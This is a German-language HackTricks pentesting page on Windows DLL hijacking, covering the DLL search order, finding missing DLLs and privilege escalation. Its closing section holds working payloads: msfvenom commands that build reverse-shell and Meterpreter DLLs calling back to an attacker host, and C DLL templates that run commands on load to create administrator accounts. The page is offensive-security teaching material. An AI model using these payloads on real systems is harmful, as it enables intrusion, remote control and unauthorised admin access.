# Dll Hijacking

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie sich für eine **Hacking-Karriere** interessieren und das Unhackbare hacken möchten - **wir stellen ein!** (_fließendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

## Grundlegende Informationen

DLL-Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, um eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL-Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für die Codeausführung, das Erreichen von Persistenz und seltener für die Privileg-Eskalation verwendet. Trotz des Schwerpunkts auf der Eskalation bleibt die Methode des Hijackings unabhängig von den Zielen konsistent.

### Häufige Techniken

Es werden verschiedene Methoden für das DLL-Hijacking verwendet, von denen jede je nach DLL-Ladevorgang der Anwendung unterschiedlich effektiv ist:

1. **DLL-Ersetzung**: Austausch einer echten DLL durch eine bösartige, optional unter Verwendung von DLL-Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
2. **DLL-Suchreihenfolgen-Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL und Ausnutzen des Suchmusters der Anwendung.
3. **Phantom-DLL-Hijacking**: Erstellen einer bösartigen DLL, die von einer Anwendung geladen wird, als ob sie eine nicht vorhandene erforderliche DLL wäre.
4. **DLL-Weiterleitung**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local`-Dateien, um die Anwendung zur bösartigen DLL zu leiten.
5. **WinSxS-DLL-Ersetzung**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis, eine Methode, die häufig mit dem Side-Loading von DLLs in Verbindung gebracht wird.
6. **Relative-Pfad-DLL-Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis mit der kopierten Anwendung, ähnlich den Techniken zur Ausführung von Binärdateien über Proxys.

## Suchen fehlender DLLs

Die häufigste Methode, um fehlende DLLs in einem System zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und die **folgenden 2 Filter** einzustellen:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

und nur die **Dateisystemaktivität** anzeigen:

![](<../../.gitbook/assets/image (314).png>)

Wenn Sie nach **allgemein fehlenden DLLs** suchen, lassen Sie dies einige **Sekunden lang** laufen.\
Wenn Sie nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchen, sollten Sie **einen anderen Filter wie "Prozessname" "enthält" "\<exec name>"** festlegen, es ausführen und die Erfassung von Ereignissen stoppen.

## Ausnutzen fehlender DLLs

Um Privilegien zu eskalieren, haben wir die beste Chance, wenn wir in der Lage sind, **eine DLL zu schreiben, die von einem privilegierten Prozess geladen wird**, an einem Ort, an dem sie gesucht wird. Dadurch können wir eine DLL in einem Ordner schreiben, in dem die DLL **vor dem ursprünglichen DLL-Ordner** gesucht wird (seltsamer Fall), oder wir können in einem Ordner schreiben, in dem die DLL gesucht wird und die ursprüngliche DLL in keinem Ordner vorhanden ist.

### DLL-Suchreihenfolge

In der [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) finden Sie Informationen zur spezifischen Art und Weise, wie DLLs geladen werden.

**Windows-Anwendungen** suchen DLLs, indem sie einer Reihe von vordefinierten Suchpfaden folgen. Das Problem des DLL-Hijackings tritt auf, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird und sicherstellt, dass sie vor der authentischen DLL geladen wird. Eine Lösung, um dies zu verhindern, besteht darin, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Sie können die **DLL-Suchreihenfolge auf 32-Bit-Systemen** unten sehen:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwenden Sie die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses abruft, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwenden Sie die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses zu erhalten. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachten Sie, dass dies den per Anwendung festgelegten Pfad, der durch den Registrierungsschlüssel **App Paths** spezifiziert ist, nicht einschließt. Der **App Paths**-Schlüssel wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Dies ist die **Standard**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn diese Funktion deaktiviert ist, rückt das aktuelle Verzeichnis an die zweite Stelle. Um diese Funktion zu deaktivieren, erstellen Sie den Registrierungswert **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setzen Sie ihn auf 0 (Standard ist aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das von **LoadLibraryEx** geladen wird.

Beachten Sie schließlich, dass **eine DLL geladen werden kann, indem der absolute Pfad angegeben wird, anstatt nur den Namen**. In diesem Fall wird die DLL **nur in diesem Pfad gesucht** (wenn die DLL Abhängigkeiten hat, werden sie nur nach dem Namen gesucht, wie sie geladen wurden).

Es gibt andere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erklären.
#### Ausnahmen in der DLL-Suchreihenfolge gemäß den Windows-Dokumenten

In den Windows-Dokumenten werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge erwähnt:

- Wenn eine DLL, die denselben Namen wie eine bereits im Speicher geladene DLL hat, gefunden wird, umgeht das System die übliche Suche. Stattdessen überprüft es eine Umleitung und ein Manifest, bevor es zur bereits im Speicher befindlichen DLL wechselt. In diesem Szenario führt das System keine Suche nach der DLL durch.
- In Fällen, in denen die DLL als bekannte DLL für die aktuelle Windows-Version erkannt wird, verwendet das System seine Version der bekannten DLL zusammen mit allen abhängigen DLLs und verzichtet auf den Suchprozess. Der Registrierungsschlüssel HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs enthält eine Liste dieser bekannten DLLs.
- Wenn eine DLL Abhängigkeiten hat, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als ob sie nur durch ihre Modulnamen angegeben wären, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.


### Eskalation von Privilegien

**Voraussetzungen**:

- Identifizieren Sie einen Prozess, der unter **unterschiedlichen Berechtigungen** (horizontale oder laterale Bewegung) arbeitet oder arbeiten wird und dem eine DLL fehlt.
- Stellen Sie sicher, dass **Schreibzugriff** für ein beliebiges **Verzeichnis** vorhanden ist, in dem nach der **DLL gesucht wird**. Dieser Speicherort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwierig zu erfüllen, da es standardmäßig seltsam ist, eine privilegierte ausführbare Datei zu finden, die eine DLL vermisst, und es ist noch seltsamer, Schreibberechtigungen für einen Systempfadordner zu haben (standardmäßig nicht möglich). Aber in fehlerhaft konfigurierten Umgebungen ist dies möglich.\
Falls Sie Glück haben und die Voraussetzungen erfüllen, können Sie das Projekt [UACME](https://github.com/hfiref0x/UACME) überprüfen. Auch wenn das **Hauptziel des Projekts das Umgehen von UAC ist**, finden Sie dort möglicherweise einen PoC für eine DLL-Hijacking-Methode für die Windows-Version, die Sie verwenden können (wahrscheinlich müssen Sie nur den Pfad des Ordners ändern, für den Sie Schreibberechtigungen haben).

Beachten Sie, dass Sie **Ihre Berechtigungen in einem Ordner überprüfen können**, indem Sie Folgendes tun:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **überprüfen Sie die Berechtigungen aller Ordner innerhalb des PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die Imports einer ausführbaren Datei und die Exports einer DLL mit folgendem Befehl überprüfen:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren**, mit Berechtigungen zum Schreiben in einem **Systempfad-Ordner**, siehe:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automatisierte Tools

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) überprüft, ob Sie Schreibberechtigungen für einen beliebigen Ordner im Systempfad haben.\
Andere interessante automatisierte Tools zur Entdeckung dieser Schwachstelle sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll_.

### Beispiel

Wenn Sie ein ausnutzbares Szenario finden, ist eine der wichtigsten Voraussetzungen für einen erfolgreichen Angriff das **Erstellen einer DLL, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importiert**. Beachten Sie jedoch, dass Dll Hijacking nützlich ist, um vom Medium-Integritätslevel auf High **(um UAC zu umgehen)** oder von **High-Integrität auf SYSTEM** zu eskalieren. Ein Beispiel für das Erstellen einer gültigen DLL finden Sie in dieser Studie zum DLL-Hijacking, die sich auf das Ausführen von DLL-Hijacking konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Darüber hinaus finden Sie im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** oder zur Erstellung einer **DLL mit nicht erforderlichen exportierten Funktionen** nützlich sein könnten.

## **Erstellen und Kompilieren von DLLs**

### **Dll-Proxifizierung**

Grundsätzlich ist ein **Dll-Proxy** eine DLL, die in der Lage ist, **Ihren bösartigen Code beim Laden auszuführen**, aber auch als **erwartet** zu **fungieren**, indem alle Aufrufe an die echte Bibliothek weitergeleitet werden.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) können Sie tatsächlich ein ausführbares Programm angeben und die Bibliothek auswählen, die Sie proxifizieren möchten, und eine proxifizierte DLL generieren oder die DLL angeben und eine proxifizierte DLL generieren.

### **Meterpreter**

**Erhalten Sie eine Reverse-Shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Meterpreter erhalten (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Benutzer erstellen (x86, ich habe keine x64-Version gesehen):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachten Sie, dass in mehreren Fällen die Dll, die Sie kompilieren, **mehrere Funktionen exportieren muss**, die vom Opferprozess geladen werden. Wenn diese Funktionen nicht vorhanden sind, kann die **Binärdatei sie nicht laden** und der **Exploit wird fehlschlagen**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referenzen
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Wenn Sie an einer **Hackerkarriere** interessiert sind und das Unhackbare hacken möchten - **wir stellen ein!** (_fließendes Polnisch in Wort und Schrift erforderlich_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
